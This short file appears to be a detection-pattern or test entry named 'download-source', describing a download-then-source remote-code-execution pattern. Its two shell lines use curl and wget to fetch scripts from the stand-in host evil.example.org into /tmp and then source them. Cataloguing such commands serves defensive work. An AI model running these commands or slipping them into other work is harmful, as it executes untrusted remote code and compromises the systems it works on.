---
name: download-source
description: download-then-source RCE pattern
---

```
curl -o /tmp/p.sh https://evil.example.org/p.sh && . /tmp/p.sh
wget -O /tmp/q.sh https://evil.example.org/q.sh; source /tmp/q.sh
```
